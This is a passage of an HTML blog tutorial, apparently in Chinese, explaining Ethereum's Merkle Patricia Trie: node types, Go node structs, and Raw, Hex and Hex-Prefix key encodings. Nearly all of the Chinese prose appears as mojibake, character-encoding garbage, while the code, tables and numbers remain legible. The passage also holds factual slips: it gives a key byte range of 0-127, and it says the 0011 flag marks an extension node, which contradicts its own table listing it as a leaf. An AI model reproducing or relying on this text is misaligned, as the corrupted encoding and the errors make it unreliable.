<li>å‡å°‘å­˜å‚¨ç©ºé—´æµªè´¹ï¼Œé¿å…å­˜å‚¨æ— ç”¨çš„èŠ‚ç‚¹ï¼›</li>
</ul>
<p>å¦å¤–ï¼Œå†çœ‹ä¸€ä¸ªä¾‹å­ï¼Œè¿™ç§æ ‘å¯ä»¥ç”¨æ¥å­˜é”®å€¼å¯¹ï¼Œkeyå°±æ˜¯è·¯å¾„ä¸Šçš„å­—ç¬¦ä¸²ï¼Œvalueçš„å€¼å­˜å‚¨åœ¨å¶å­èŠ‚ç‚¹ã€‚ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233084.jpg" alt="img"></p>
<p>æ ‘ä¸­æ‰€å­˜å‚¨çš„é”®å€¼å¯¹ï¼š</p>
<ul>
<li>6c0a5c71ec20bq3w &#x3D;&gt; 5</li>
<li>6c0a5c71ec20CX7j &#x3D;&gt; 27</li>
<li>6c0a5c71781a1FXq &#x3D;&gt; 18</li>
<li>6c0a5c71781a9Dog &#x3D;&gt; 64</li>
<li>6c0a8f743b95zUfe &#x3D;&gt; 30</li>
<li>6c0a8f743b95jx5R &#x3D;&gt; 2</li>
<li>6c0a8f740d16y03G &#x3D;&gt; 43</li>
<li>6c0a8f740d16vcc1 &#x3D;&gt; 48</li>
</ul>
<p>å°±ä»¥å¤ªåŠè€Œè¨€ï¼ŒçŠ¶æ€æ ‘çš„é”® &#x2F; å€¼æ˜ å°„æ˜¯åœ°å€ä¸ç›¸å…³è´¦æˆ·ä¹‹é—´çš„æ˜ å°„ï¼Œå³æŒ‡å‘æ¯ä¸ªè´¦æˆ·çš„ balanceã€nonceã€codeHash å’Œ storageRootã€‚</p>
<hr>
<p><strong>åœ¨ä»¥å¤ªåŠä¸­çš„MPTæ ‘ä¸­ï¼Œæ ‘èŠ‚ç‚¹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å››ç±»ï¼š</strong></p>
<ul>
<li>ç©ºèŠ‚ç‚¹ï¼š(represented as the empty string)</li>
<li>åˆ†æ”¯èŠ‚ç‚¹ï¼šA 17-item node<code>[ v0 ... v15, vt ]</code></li>
<li>å¶å­èŠ‚ç‚¹ï¼šA 2-item node<code>[ encodedPath, value ]</code></li>
<li>æ‰©å±•èŠ‚ç‚¹ï¼šA 2-item node<code>[ encodedPath, key ]</code></li>
</ul>
<p>ç©ºèŠ‚ç‚¹ï¼Œç®€å•çš„è¡¨ç¤ºç©ºï¼Œåœ¨ä»£ç ä¸­æ˜¯ä¸€ä¸ªç©ºä¸²ã€‚</p>
<p>å¶å­èŠ‚ç‚¹ï¼ˆleafï¼‰ï¼Œè¡¨ç¤ºä¸º[key,value]çš„ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå…¶ä¸­keyæ˜¯keyçš„ä¸€ç§ç‰¹æ®Šåå…­è¿›åˆ¶ç¼–ç ï¼Œvalueæ˜¯valueçš„RLPç¼–ç ã€‚</p>
<p>æ‰©å±•èŠ‚ç‚¹ï¼ˆextensionï¼‰ï¼Œä¹Ÿæ˜¯[keyï¼Œvalue]çš„ä¸€ä¸ªé”®å€¼å¯¹ï¼Œä½†æ˜¯è¿™é‡Œçš„valueæ˜¯å…¶ä»–èŠ‚ç‚¹çš„hashå€¼ï¼Œè¿™ä¸ªhashå¯ä»¥è¢«ç”¨æ¥æŸ¥è¯¢æ•°æ®åº“ä¸­çš„èŠ‚ç‚¹ã€‚ä¹Ÿå°±æ˜¯è¯´é€šè¿‡hashé“¾æ¥åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚</p>
<p>åˆ†æ”¯èŠ‚ç‚¹ï¼ˆbranchï¼‰ï¼Œå› ä¸ºMPTæ ‘ä¸­çš„keyè¢«ç¼–ç æˆä¸€ç§ç‰¹æ®Šçš„16è¿›åˆ¶çš„è¡¨ç¤ºï¼Œå†åŠ ä¸Šæœ€åçš„valueï¼Œæ‰€ä»¥åˆ†æ”¯èŠ‚ç‚¹æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º17çš„listï¼Œå‰16ä¸ªå…ƒç´ å¯¹åº”ç€keyä¸­çš„16ä¸ªå¯èƒ½çš„åå…­è¿›åˆ¶å­—ç¬¦ï¼Œå¦‚æœæœ‰ä¸€ä¸ª[key,value]å¯¹åœ¨è¿™ä¸ªåˆ†æ”¯èŠ‚ç‚¹ç»ˆæ­¢ï¼Œæœ€åä¸€ä¸ªå…ƒç´ ä»£è¡¨ä¸€ä¸ªå€¼ï¼Œå³åˆ†æ”¯èŠ‚ç‚¹æ—¢å¯ä»¥æœç´¢è·¯å¾„çš„ç»ˆæ­¢ä¹Ÿå¯ä»¥æ˜¯è·¯å¾„çš„ä¸­é—´èŠ‚ç‚¹ã€‚</p>
<p><strong>åˆ†æ”¯èŠ‚ç‚¹</strong></p>
<p>åˆ†æ”¯èŠ‚ç‚¹ç”¨æ¥è¡¨ç¤ºMPTæ ‘ä¸­æ‰€æœ‰æ‹¥æœ‰è¶…è¿‡1ä¸ªå­©å­èŠ‚ç‚¹ä»¥ä¸Šçš„éå¶å­èŠ‚ç‚¹ï¼Œ å…¶å®šä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">type fullNode struct &#123;</span><br><span class="line">        Children [17]node // Actual trie node data to encode/decode (needs custom encoder)</span><br><span class="line">        flags    nodeFlag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// nodeFlag contains caching-related metadata about a node.</span><br><span class="line">type nodeFlag struct &#123;</span><br><span class="line">    hash  hashNode // cached hash of the node (may be nil)</span><br><span class="line">    gen   uint16   // cache generation counter</span><br><span class="line">    dirty bool     // whether the node has changes that must be written to the database</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸å‰ç¼€æ ‘ç›¸åŒï¼ŒMPTåŒæ ·æ˜¯æŠŠkey-valueæ•°æ®é¡¹çš„keyç¼–ç åœ¨æ ‘çš„è·¯å¾„ä¸­ï¼Œä½†æ˜¯keyçš„æ¯ä¸€ä¸ªå­—èŠ‚å€¼çš„èŒƒå›´å¤ªå¤§ï¼ˆ[0-127]ï¼‰ï¼Œå› æ­¤åœ¨ä»¥å¤ªåŠä¸­ï¼Œåœ¨è¿›è¡Œæ ‘æ“ä½œä¹‹å‰ï¼Œé¦–å…ˆä¼šè¿›è¡Œä¸€ä¸ªkeyç¼–ç çš„è½¬æ¢ï¼ˆä¸‹èŠ‚ä¼šè¯¦è¿°ï¼‰ï¼Œå°†ä¸€ä¸ªå­—èŠ‚çš„é«˜ä½å››ä½å†…å®¹åˆ†æ‹†æˆä¸¤ä¸ªå­—èŠ‚å­˜å‚¨ã€‚é€šè¿‡ç¼–ç è½¬æ¢ï¼Œ<code>key&#39;</code>çš„æ¯ä¸€ä½çš„å€¼èŒƒå›´éƒ½åœ¨[0, 15]å†…ã€‚å› æ­¤ï¼Œä¸€ä¸ªåˆ†æ”¯èŠ‚ç‚¹çš„å­©å­è‡³å¤šåªæœ‰16ä¸ªã€‚ä»¥å¤ªåŠé€šè¿‡è¿™ç§æ–¹å¼ï¼Œå‡å°äº†æ¯ä¸ªåˆ†æ”¯èŠ‚ç‚¹çš„å®¹é‡ï¼Œä½†æ˜¯å¢åŠ äº†æ ‘é«˜ã€‚</p>
<p>åˆ†æ”¯èŠ‚ç‚¹çš„å­©å­åˆ—è¡¨ä¸­ï¼Œæœ€åä¸€ä¸ªå…ƒç´ æ˜¯ç”¨æ¥å­˜å‚¨è‡ªèº«çš„å†…å®¹ã€‚</p>
<p>æ­¤å¤–ï¼Œæ¯ä¸ªåˆ†æ”¯èŠ‚ç‚¹ä¼šæœ‰ä¸€ä¸ªé™„å¸¦çš„å­—æ®µ<code>nodeFlag</code>ï¼Œè®°å½•äº†ä¸€äº›è¾…åŠ©æ•°æ®ï¼š</p>
<ul>
<li>èŠ‚ç‚¹å“ˆå¸Œï¼šè‹¥è¯¥å­—æ®µä¸ä¸ºç©ºï¼Œåˆ™å½“éœ€è¦è¿›è¡Œå“ˆå¸Œè®¡ç®—æ—¶ï¼Œå¯ä»¥è·³è¿‡è®¡ç®—è¿‡ç¨‹è€Œç›´æ¥ä½¿ç”¨ä¸Šæ¬¡è®¡ç®—çš„ç»“æœï¼ˆå½“èŠ‚ç‚¹å˜è„æ—¶ï¼Œè¯¥å­—æ®µè¢«ç½®ç©ºï¼‰ï¼›</li>
<li>è„æ ‡å¿—ï¼šå½“ä¸€ä¸ªèŠ‚ç‚¹è¢«ä¿®æ”¹æ—¶ï¼Œè¯¥æ ‡å¿—ä½è¢«ç½®ä¸º1ï¼›</li>
<li>è¯ç”Ÿæ ‡å¿—ï¼šå½“è¯¥èŠ‚ç‚¹ç¬¬ä¸€æ¬¡è¢«è½½å…¥å†…å­˜ä¸­ï¼ˆæˆ–è¢«ä¿®æ”¹æ—¶ï¼‰ï¼Œä¼šè¢«èµ‹äºˆä¸€ä¸ªè®¡æ•°å€¼ä½œä¸ºè¯ç”Ÿæ ‡å¿—ï¼Œè¯¥æ ‡å¿—ä¼šè¢«ä½œä¸ºèŠ‚ç‚¹é©±é™¤çš„ä¾æ®ï¼Œæ¸…é™¤å†…å­˜ä¸­â€œå¤ªè€â€çš„æœªè¢«ä¿®æ”¹çš„èŠ‚ç‚¹ï¼Œé˜²æ­¢å ç”¨çš„å†…å­˜ç©ºé—´è¿‡å¤šï¼›</li>
</ul>
<p><strong>å¶å­èŠ‚ç‚¹&amp;&amp;æ‰©å±•èŠ‚ç‚¹</strong></p>
<p>å¶å­èŠ‚ç‚¹ä¸æ‰©å±•èŠ‚ç‚¹çš„å®šä¹‰ç›¸ä¼¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">type shortNode struct &#123;</span><br><span class="line">        Key   []byte</span><br><span class="line">        Val   node</span><br><span class="line">        flags nodeFlag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å…³é”®çš„å­—æ®µä¸ºï¼š</p>
<ul>
<li>Keyï¼šç”¨æ¥å­˜å‚¨***å±äºè¯¥èŠ‚ç‚¹èŒƒå›´çš„key***ï¼›</li>
<li>Valï¼šç”¨æ¥å­˜å‚¨è¯¥èŠ‚ç‚¹çš„å†…å®¹ï¼›</li>
</ul>
<p>å…¶ä¸­<code>Key</code>æ˜¯MPTæ ‘å®ç°æ ‘é«˜å‹ç¼©çš„å…³é”®ã€‚å½“MPTè¯•å›¾æ’å…¥ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ’å…¥è¿‡ç¨‹ä¸­å‘ç°ç›®å‰æ²¡æœ‰ä¸è¯¥èŠ‚ç‚¹Keyæ‹¥æœ‰ç›¸åŒå‰ç¼€çš„è·¯å¾„ã€‚æ­¤æ—¶MPTæŠŠ***å‰©ä½™çš„Key***å­˜å‚¨åœ¨å¶å­ï¼æ‰©å±•èŠ‚ç‚¹çš„Keyå­—æ®µä¸­ï¼Œå……å½“ä¸€ä¸ªâ€Shortcutâ€œã€‚ã€å¯ä»¥ç»“åˆä¸Šé¢toastingçš„ä¾‹å­ã€‘</p>
<p>æ­¤å¤–Valå­—æ®µç”¨æ¥å­˜å‚¨å¶å­ï¼æ‰©å±•èŠ‚ç‚¹çš„å†…å®¹ï¼Œå¯¹äºå¶å­èŠ‚ç‚¹æ¥è¯´ï¼Œè¯¥å­—æ®µå­˜å‚¨çš„æ˜¯ä¸€ä¸ªæ•°æ®é¡¹çš„å†…å®¹ï¼›è€Œå¯¹äºæ‰©å±•èŠ‚ç‚¹æ¥è¯´ï¼Œè¯¥å­—æ®µå¯ä»¥æ˜¯ä»¥ä¸‹ä¸¤ç§å†…å®¹ï¼š</p>
<ol>
<li>Valå­—æ®µå­˜å‚¨çš„æ˜¯å…¶å­©å­èŠ‚ç‚¹åœ¨æ•°æ®åº“ä¸­å­˜å‚¨çš„ç´¢å¼•å€¼ï¼ˆå…¶å®è¯¥ç´¢å¼•å€¼ä¹Ÿæ˜¯å­©å­èŠ‚ç‚¹çš„å“ˆå¸Œå€¼ï¼‰ï¼›</li>
<li>Valå­—æ®µå­˜å‚¨çš„æ˜¯å…¶å­©å­èŠ‚ç‚¹çš„å¼•ç”¨ï¼›</li>
</ol>
<p>ç”±äºå¶å­&#x2F;æ‰©å±•èŠ‚ç‚¹å…±äº«ä¸€å¥—å®šä¹‰ï¼Œé‚£ä¹ˆæ€ä¹ˆæ¥åŒºåˆ†Valå­—æ®µå­˜å‚¨çš„åˆ°åº•æ˜¯ä¸€ä¸ªæ•°æ®é¡¹çš„å†…å®¹ï¼Œè¿˜æ˜¯ä¸€ä¸²å“ˆå¸Œç´¢å¼•å‘¢ï¼Ÿåœ¨ä»¥å¤ªåŠä¸­ï¼Œé€šè¿‡åœ¨Keyä¸­åŠ å…¥ç‰¹æ®Šçš„æ ‡å¿—æ¥åŒºåˆ†ä¸¤ç§ç±»å‹çš„èŠ‚ç‚¹ã€‚</p>
<h2 id="è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µæ˜¯ï¼škeyå€¼ç¼–ç "><a href="#è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µæ˜¯ï¼škeyå€¼ç¼–ç " class="headerlink" title="è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µæ˜¯ï¼škeyå€¼ç¼–ç "></a><strong>è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µæ˜¯ï¼škeyå€¼ç¼–ç </strong></h2><p>åœ¨ä»¥å¤ªåŠä¸­ï¼ŒMPTæ ‘çš„keyå€¼å…±æœ‰ä¸‰ç§ä¸åŒçš„ç¼–ç æ–¹å¼ï¼Œä»¥æ»¡è¶³ä¸åŒåœºæ™¯çš„ä¸åŒéœ€æ±‚ï¼Œåœ¨è¿™é‡Œå•ç‹¬ä½œä¸ºä¸€èŠ‚è¿›è¡Œä»‹ç»ã€‚</p>
<p>ä¸‰ç§ç¼–ç æ–¹å¼åˆ†åˆ«ä¸ºï¼š</p>
<ol>
<li>Rawç¼–ç ï¼ˆåŸç”Ÿçš„å­—ç¬¦ï¼‰ï¼›</li>
<li>Hexç¼–ç ï¼ˆæ‰©å±•çš„16è¿›åˆ¶ç¼–ç ï¼‰ï¼›</li>
<li>Hex-Prefixç¼–ç ï¼ˆ16è¿›åˆ¶å‰ç¼€ç¼–ç ï¼‰ï¼›</li>
</ol>
<h3 id="Rawç¼–ç "><a href="#Rawç¼–ç " class="headerlink" title="Rawç¼–ç "></a>Rawç¼–ç </h3><p>Rawç¼–ç å°±æ˜¯åŸç”Ÿçš„keyå€¼ï¼Œä¸åšä»»ä½•æ”¹å˜ã€‚è¿™ç§ç¼–ç æ–¹å¼çš„keyï¼Œæ˜¯MPTå¯¹å¤–æä¾›æ¥å£çš„é»˜è®¤ç¼–ç æ–¹å¼ã€‚</p>
<blockquote>
<p>ä¾‹å¦‚ä¸€æ¡keyä¸ºâ€œcatâ€ï¼Œvalueä¸ºâ€œdogâ€çš„æ•°æ®é¡¹ï¼Œå…¶Rawç¼–ç å°±æ˜¯[â€˜câ€™, â€˜aâ€™, â€˜tâ€™]ï¼Œæ¢æˆASCIIè¡¨ç¤ºæ–¹å¼å°±æ˜¯[63, 61, 74]</p>
</blockquote>
<h3 id="Hexç¼–ç "><a href="#Hexç¼–ç " class="headerlink" title="Hexç¼–ç "></a>Hexç¼–ç </h3><p>åœ¨ä»‹ç»åˆ†æ”¯èŠ‚ç‚¹çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä»‹ç»äº†ï¼Œä¸ºäº†å‡å°‘åˆ†æ”¯èŠ‚ç‚¹å­©å­çš„ä¸ªæ•°ï¼Œéœ€è¦å°†keyçš„ç¼–ç è¿›è¡Œè½¬æ¢ï¼Œå°†åŸkeyçš„é«˜ä½å››ä½åˆ†æ‹†æˆä¸¤ä¸ªå­—èŠ‚è¿›è¡Œå­˜å‚¨ã€‚è¿™ç§è½¬æ¢åçš„keyçš„ç¼–ç æ–¹å¼ï¼Œå°±æ˜¯Hexç¼–ç ã€‚</p>
<p>ä»Rawç¼–ç å‘Hexç¼–ç çš„è½¬æ¢è§„åˆ™æ˜¯ï¼š</p>
<ul>
<li>å°†Rawç¼–ç çš„æ¯ä¸ªå­—ç¬¦ï¼Œæ ¹æ®é«˜4ä½ä½4ä½(nibble)æ‹†æˆä¸¤ä¸ªå­—èŠ‚ï¼›</li>
<li>è‹¥è¯¥Keyå¯¹åº”çš„èŠ‚ç‚¹å­˜å‚¨çš„æ˜¯çœŸå®çš„æ•°æ®é¡¹å†…å®¹ï¼ˆå³è¯¥èŠ‚ç‚¹æ˜¯å¶å­èŠ‚ç‚¹ï¼‰ï¼Œåˆ™åœ¨æœ«ä½æ·»åŠ ä¸€ä¸ªASCIIå€¼ä¸º16çš„å­—ç¬¦ä½œä¸ºç»ˆæ­¢æ ‡å¿—ç¬¦ï¼›</li>
<li>è‹¥è¯¥keyå¯¹åº”çš„èŠ‚ç‚¹å­˜å‚¨çš„æ˜¯å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹çš„å“ˆå¸Œç´¢å¼•ï¼ˆå³è¯¥èŠ‚ç‚¹æ˜¯æ‰©å±•èŠ‚ç‚¹ï¼‰ï¼Œåˆ™ä¸åŠ ä»»ä½•å­—ç¬¦ï¼›</li>
</ul>
<blockquote>
<p>keyä¸ºâ€œcatâ€, valueä¸ºâ€œdogâ€çš„æ•°æ®é¡¹ï¼Œå…¶Hexç¼–ç ä¸º[6, 3, 6, 1, 7, 4, 10]</p>
</blockquote>
<p><em>Hexç¼–ç ç”¨äºå¯¹å†…å­˜ä¸­MPTæ ‘èŠ‚ç‚¹keyè¿›è¡Œç¼–ç </em></p>
<h3 id="HPç¼–ç "><a href="#HPç¼–ç " class="headerlink" title="HPç¼–ç "></a>HPç¼–ç </h3><p>MPTæ ‘ä¸­å¦å¤–ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åå…­è¿›åˆ¶å‰ç¼€(hex-prefix, HP)ç¼–ç ï¼Œç”¨æ¥å¯¹keyè¿›è¡Œç¼–ç ã€‚å› ä¸ºæœ‰ä¸¤ç§[key,value]èŠ‚ç‚¹(å¶èŠ‚ç‚¹å’Œæ‰©å±•èŠ‚ç‚¹)ï¼Œæ‰€ä»¥éœ€è¦å¯¹å®ƒä»¬è¿›è¡ŒåŒºåˆ†ã€‚æ­¤æ—¶ï¼Œå¼•è¿›ä¸€ç§ç‰¹æ®Šçš„æ ‡è¯†ï¼ˆä¸€ä¸ªbitå³å¯ï¼‰æ¥æ ‡è¯†keyæ‰€å¯¹åº”çš„æ˜¯å€¼æ˜¯å¶å­ï¼Œè¿˜æ˜¯å…¶ä»–èŠ‚ç‚¹çš„hashã€‚å¦‚æœæ ‡è¯†ç¬¦æ˜¯1ï¼Œé‚£ä¹ˆkeyå¯¹åº”çš„æ˜¯å¶èŠ‚ç‚¹ï¼Œåä¹‹åˆ™æ˜¯æ‰©å±•èŠ‚ç‚¹ã€‚</p>
<p>å¦å¤–éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨æŸä¸ªèŠ‚ç‚¹å¤„ï¼Œå½“å‰è·¯å¾„çš„é•¿åº¦å¯èƒ½æ˜¯å¥‡æ•°ã€‚æ­¤æ—¶ä¼šé¢ä¸´çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå› ä¸ºè·¯å¾„æœ¬èº«æ˜¯æŒ‰ç…§4ä½ï¼Œä¹Ÿå³ä¸€ä¸ªnibbleä¸ºå•ä½çš„ï¼Œä½†æ˜¯å­˜å‚¨çš„æ—¶å€™æ€»æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ã€‚å‡è®¾å½“å‰æœ‰ä¸¤ä¸ªè·¯å¾„åˆ†åˆ«æ˜¯â€˜136â€™å’Œâ€˜0136â€™ï¼Œåœ¨å­˜å‚¨çš„æ—¶å€™æ˜¯æ²¡æœ‰åŠæ³•åŒºåˆ†çš„ï¼Œå› ä¸ºä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œå­˜å‚¨çš„æ—¶å€™ï¼Œæ€»æ˜¯ä¼šè½¬åŒ–ä¸º01 + 36ä¸¤ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥ï¼Œåœ¨HPç¼–ç ä¸­ï¼Œè¿˜å¿…é¡»æœ‰ä¸€ä¸ªæ ‡è¯†è¿›è¡Œè·¯å¾„é•¿åº¦å¥‡å¶æ€§çš„æ ‡è¯†ã€‚ã€æ³¨ï¼šè¦ç»“åˆä¸‹é¢å…·ä½“çš„ä¾‹å­çœ‹ï¼Œè¿™é‡Œçš„è·¯å¾„ä¸æ˜¯ä»æ ¹åˆ°å¶å­çš„å®Œæ•´çš„è·¯å¾„ï¼ˆæ€»æ˜¯å¶æ•°ï¼‰ï¼Œè€Œæ˜¯å½“å‰åœ¨å¶å­èŠ‚ç‚¹&#x2F;æ‰©å±•èŠ‚ç‚¹ä¸­å­˜å‚¨çš„è·¯å¾„çš„é•¿åº¦ã€‘</p>
<p>æ‰€ä»¥åœ¨MPTæ ‘ä¸­ï¼Œå¯¹æ¯ä¸ªè·¯å¾„ï¼ˆå¶å­èŠ‚ç‚¹é¦–å…ˆç§»é™¤æœ«å°¾çš„16ï¼‰ï¼Œæ€»æ˜¯è¦é¦–å…ˆåŠ ä¸Šä¸€ä¸ªnibbleï¼Œè¿™ä¸ªNibbleçš„æœ€ä½ä½è¡¨ç¤ºèŠ‚ç‚¹è·¯å¾„é•¿åº¦å¥‡å¶æ€§ï¼Œç¬¬äºŒä½ä½è¡¨ç¤ºèŠ‚ç‚¹çš„æ€§è´¨ã€‚</p>
<p>å¦‚æœkeyæ˜¯å¶æ•°é•¿åº¦ï¼Œé‚£ä¹ˆå› ä¸ºåˆåŠ äº†ä¸€ä¸ªå››ä¸ªæ¯”ç‰¹ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Šå¦å¤–ä¸€ä¸ªå€¼ä¸º0çš„nibbleï¼Œä½¿å¾—æ•´ä½“é•¿åº¦ä¸ºå¶æ•°ã€‚</p>
<p>HPç¼–ç çš„è§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>è‹¥åŸkeyçš„æœ«å°¾å­—èŠ‚çš„å€¼ä¸º16ï¼ˆå³è¯¥èŠ‚ç‚¹æ˜¯å¶å­èŠ‚ç‚¹ï¼‰ï¼Œå»æ‰è¯¥å­—èŠ‚ï¼›</li>
<li>åœ¨keyä¹‹å‰å¢åŠ ä¸€ä¸ªåŠå­—èŠ‚ï¼Œå…¶ä¸­æœ€ä½ä½ç”¨æ¥ç¼–ç åŸæœ¬keyé•¿åº¦çš„å¥‡å¶ä¿¡æ¯ï¼Œkeyé•¿åº¦ä¸ºå¥‡æ•°ï¼Œåˆ™è¯¥ä½ä¸º1ï¼›ä½2ä½ä¸­ç¼–ç ä¸€ä¸ªç‰¹æ®Šçš„ç»ˆæ­¢æ ‡è®°ç¬¦ï¼Œè‹¥è¯¥èŠ‚ç‚¹ä¸ºå¶å­èŠ‚ç‚¹ï¼Œåˆ™è¯¥ä½ä¸º1ï¼›</li>
<li>è‹¥åŸæœ¬keyçš„é•¿åº¦ä¸ºå¶æ•°ï¼Œåˆ™åœ¨keyä¹‹å‰å†å¢åŠ ä¸€ä¸ªå€¼ä¸º0x0çš„<strong>åŠå­—èŠ‚</strong>ï¼›</li>
<li>å°†åŸæœ¬keyçš„å†…å®¹ä½œå‹ç¼©ï¼Œå³å°†ä¸¤ä¸ªå­—ç¬¦ä»¥é«˜4ä½ä½4ä½è¿›è¡Œåˆ’åˆ†ï¼Œå­˜å‚¨åœ¨ä¸€ä¸ªå­—èŠ‚ä¸­ï¼ˆHexæ‰©å±•çš„é€†è¿‡ç¨‹ï¼‰ï¼›</li>
</ul>
<blockquote>
<p>è‹¥Hexç¼–ç ä¸º[6, 3, 6, 1, 7, 4, 10]ï¼Œåˆ™HPç¼–ç çš„å€¼ä¸º[20, 63, 61, 74]</p>
</blockquote>
<p>æ‰€æ·»åŠ çš„nibbleçš„å€¼å’Œæ‰€å¯¹åº”çš„èŠ‚ç‚¹çš„è·¯å¾„çš„æ€§è´¨è¡¨å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hex char    bits    |    node type partial     path length</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">   0        0000    |       extension              even        </span><br><span class="line">   1        0001    |       extension              odd         </span><br><span class="line">   2        0010    |   terminating (leaf)         even        </span><br><span class="line">   3        0011    |   terminating (leaf)         odd</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®bitså¯ä»¥åˆ¤æ–­å‡ºèŠ‚ç‚¹çš„ç±»å‹å’Œæœç´¢è·¯å¾„é•¿åº¦çš„å¥‡å¶æ€§ã€‚0000ï¼ŒæŸ¥çœ‹æœ€åä¸¤ä½çš„æƒ…å†µï¼Œå€’æ•°ç¬¬äºŒä½æ˜¯0ï¼Œè¯´æ˜æ˜¯extensionèŠ‚ç‚¹ï¼›æœ€åä¸€ä½æ˜¯0ï¼Œè¯´æ˜è·¯å¾„é•¿åº¦æ˜¯å¶æ•°ã€‚0011ï¼Œæœ€åä¸¤ä½çš„å€¼æ˜¯11ï¼Œç¬¬äºŒä½ä½æ˜¯1è¯´æ˜æ˜¯æ‰©å±•èŠ‚ç‚¹ï¼Œæœ€åä¸€ä½æ˜¯1è¯´æ˜è·¯å¾„é•¿åº¦ä¸ºå¥‡æ•°ã€‚å‰©ä¸‹ä¸¤ç§æƒ…å†µç±»ä¼¼å¯åˆ†æã€‚</p>
<p><strong>è½¬æ¢å…³ç³»</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233085.jpg" alt="img"></p>
<p>ä»¥ä¸Šä¸‰ç§ç¼–ç æ–¹å¼çš„è½¬æ¢å…³ç³»ä¸ºï¼š</p>
<ul>
<li>Rawç¼–ç ï¼šåŸç”Ÿçš„keyç¼–ç ï¼Œæ˜¯MPTå¯¹å¤–æä¾›æ¥å£ä¸­ä½¿ç”¨çš„ç¼–ç æ–¹å¼ï¼Œå½“æ•°æ®é¡¹è¢«æ’å…¥åˆ°æ ‘ä¸­æ—¶ï¼ŒRawç¼–ç è¢«è½¬æ¢æˆHexç¼–ç ï¼›</li>
<li>Hexç¼–ç ï¼š16è¿›åˆ¶æ‰©å±•ç¼–ç ï¼Œç”¨äºå¯¹å†…å­˜ä¸­æ ‘èŠ‚ç‚¹keyè¿›è¡Œç¼–ç ï¼Œå½“æ ‘èŠ‚ç‚¹è¢«æŒä¹…åŒ–åˆ°æ•°æ®åº“æ—¶ï¼ŒHexç¼–ç è¢«è½¬æ¢æˆHPç¼–ç ï¼›</li>
<li>HPç¼–ç ï¼š16è¿›åˆ¶å‰ç¼€ç¼–ç ï¼Œç”¨äºå¯¹æ•°æ®åº“ä¸­æ ‘èŠ‚ç‚¹keyè¿›è¡Œç¼–ç ï¼Œå½“æ ‘èŠ‚ç‚¹è¢«åŠ è½½åˆ°å†…å­˜æ—¶ï¼ŒHPç¼–ç è¢«è½¬æ¢æˆHexç¼–ç ï¼›</li>
</ul>
<p>ä¸‹é¢ç»“åˆä¸€ä¸ªå…·ä½“çš„ä¾‹å­å†æ¥æè¿°ä¸€éè¿™ä¸ªè¿‡ç¨‹ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233086.jpg" alt="img">å®˜æ–¹ç¤ºä¾‹</p>
<p>åœ¨ä¸Šå›¾ä¸­ï¼Œå…±æœ‰å››ä¸ªé”®å€¼å¯¹ã€‚å››ä¸ªkeyæœ‰å…±åŒçš„å‰ç¼€a7ï¼Œå› æ­¤ï¼Œç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆä¹Ÿæ˜¯rootèŠ‚ç‚¹ï¼‰æ˜¯ä¸€ä¸ªæ‰©å±•èŠ‚ç‚¹ã€‚ä¹‹åæ¥ä¸‹æ¥æœ‰ä¸‰ä¸ªåˆ†æ”¯ï¼Œåˆ†åˆ«æ˜¯1ã€7å’Œfã€‚å› æ­¤ï¼Œæ‰©å±•èŠ‚ç‚¹ä¹‹åè·Ÿç€ä¸€ä¸ªåˆ†æ”¯èŠ‚ç‚¹ï¼Œåˆ†æ”¯èŠ‚ç‚¹ä¸­æœ‰ä¸‰ä¸ªåˆ†æ”¯ã€‚å…¶ä¸­åˆ†æ”¯1å’Œ7ä¹‹ååªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå› æ­¤ç›´æ¥åˆ°è¾¾äº†å¶å­èŠ‚ç‚¹ã€‚åˆ†æ”¯7ä¹‹åæœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œå¹¶ä¸”è¿™ä¸¤ä¸ªèŠ‚ç‚¹æœ‰å…±åŒçš„å‰ç¼€â€˜d3â€™ï¼Œæ‰€ä»¥åˆ†æ”¯7è¿ç€ä¸€ä¸ªæ‰©å±•èŠ‚ç‚¹ã€‚æ‰©å±•èŠ‚ç‚¹ä¹‹åæœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œ3å’Œ9ï¼Œå› æ­¤å†è·Ÿä¸Šä¸€ä¸ªåˆ†æ”¯èŠ‚ç‚¹ã€‚åˆ†æ”¯èŠ‚ç‚¹ä¹‹åæ˜¯ä¸¤ä¸ªå¶å­èŠ‚ç‚¹ã€‚</p>
